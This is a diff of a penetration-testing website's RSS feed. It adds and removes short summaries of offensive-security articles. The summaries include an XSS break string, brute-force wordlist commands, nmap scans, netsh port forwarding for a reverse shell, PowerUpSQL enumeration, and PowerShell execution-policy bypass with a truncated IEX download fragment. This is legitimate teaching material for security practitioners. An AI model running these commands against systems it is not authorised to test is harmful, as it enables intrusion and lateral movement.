@@ -7,6 +7,35 @@
     <generator>Hugo -- gohugo.io</generator>
     <copyright>2023</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Security Innovations - Shred - Command and Control</title>
+      <link>https://www.grayhatfreelancing.com/posts/securityinnovations-shred-cmdnctrl/</link>
+      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/posts/securityinnovations-shred-cmdnctrl/</guid>
+      <description>Ooooooh, yeah. I did it, because the range hasn&amp;rsquo;t changed for over a fucking year. That&amp;rsquo;s lazy on their part. The security industry evolves, your ranges should too. Here, I will be using https://caido.io/ instead of Burp or ZAProxy for this&amp;hellip; why? No particular reason. Just to be fair and showcase that such a thing exists. There&amp;rsquo;s also Charles, and many others.
+&amp;quot;&amp;gt;&amp;lt;plaintext&amp;gt; - Breaks the search feature, there&amp;rsquo;s cross site scripting here.</description>
+    </item>
+    
+    <item>
+      <title>Amazon AWS S3 Buckets</title>
+      <link>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</link>
+      <pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</guid>
+      <description>Amazon Bucket S3 AWS # Amazon S3 (Simple Storage Service) Buckets are data object storage buckets hosted on Amazon&amp;rsquo;s cloud service. Being in the cloud it&amp;rsquo;s a highly scalable data storge service and it allows you to set all sorts of permissions and other controls around your data. That said, there&amp;rsquo;s often plenty of juicy information in Amazon S3 buckets.. there&amp;rsquo;s also often nothing more than just images and such.</description>
+    </item>
+    
+    <item>
+      <title>CSRF Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/csrf_injection/</link>
+      <pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/csrf_injection/</guid>
+      <description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
+Tools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session.</description>
+    </item>
+    
+    <item>
       <title>Cobalt Strike</title>
       <link>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</link>
       <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
@@ -33,6 +62,7 @@ Python # armstrong numbers # import math def is_armstrong_number(number): &amp;#
       
       <guid>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</guid>
       <description>Brute Force Cracking # Making wordslists # Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
+WikiRaider # Generate wordlists fit for your &amp;ldquo;target audience&amp;rdquo;. https://github.com/NorthwaveSecurity/wikiraider
 Crunch # crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst) @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including spac crunch 6 8 -t ,@@^^%% Cewl # cewl example.</description>
     </item>
     
@@ -280,34 +310,6 @@ pipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLI
       
       <guid>https://www.grayhatfreelancing.com/docs/network_discovery/</guid>
       <description>Network Discovery # Nmap # Ping sweep (No port scan, No DNS resolution) nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v &amp;#34;host down&amp;#34; -sn : Disable port scanning. Host discovery only. -n : Never do DNS resolution Basic NMAP sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4 sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv • the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports • the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000) • 192.</description>
-    </item>
-    
-    <item>
-      <title>Network Pivoting Cheatsheet</title>
-      <link>https://www.grayhatfreelancing.com/docs/network_pivoting_techniques/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/network_pivoting_techniques/</guid>
-      <description>Network Pivoting Techniques # Windows netsh Port Forwarding # netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110 # Forward the port 4545 for the reverse shell, and the 80 for the http server for example netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545 netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80 # Correctly open the port on the machine netsh advfirewall firewall add rule name=&amp;#34;PortForwarding 80&amp;#34; dir=in action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=&amp;#34;PortForwarding 80&amp;#34; dir=out action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=&amp;#34;PortForwarding 4545&amp;#34; dir=in action=allow protocol=TCP localport=4545 netsh advfirewall firewall add rule name=&amp;#34;PortForwarding 4545&amp;#34; dir=out action=allow protocol=TCP localport=4545 listenaddress – is a local IP address waiting for a connection.</description>
-    </item>
-    
-    <item>
-      <title>Pentesting MSSQL Server Cheatsheet</title>
-      <link>https://www.grayhatfreelancing.com/docs/mssql_server_cheatsheet/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/mssql_server_cheatsheet/</guid>
-      <description>MSSQL Server # Identify Instances and Databases # Discover Local SQL Server Instances # Get-SQLInstanceLocal Discover Domain SQL Server Instances # Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults Discover Remote SQL Server Instances # Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 Identify Encrypted databases # Note: These are automatically decrypted for admins
-Get-SQLDatabase -Username sa -Password Password1234 -Instance &amp;#34;&amp;lt;DBSERVERNAME\DBInstance&amp;gt;&amp;#34; -Verbose | Where-Object {$_.</description>
-    </item>
-    
-    <item>
-      <title>Powershell Cheatsheet</title>
-      <link>https://www.grayhatfreelancing.com/docs/powershell_cheatsheet/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/powershell_cheatsheet/</guid>
-      <description>Powershell # Summary # Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References Execution Policy # powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process Constrained Mode # # Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2 Encoded Commands # Windows $command = &amp;#39;IEX (New-Object Net.</description>
     </item>
     
   </channel>
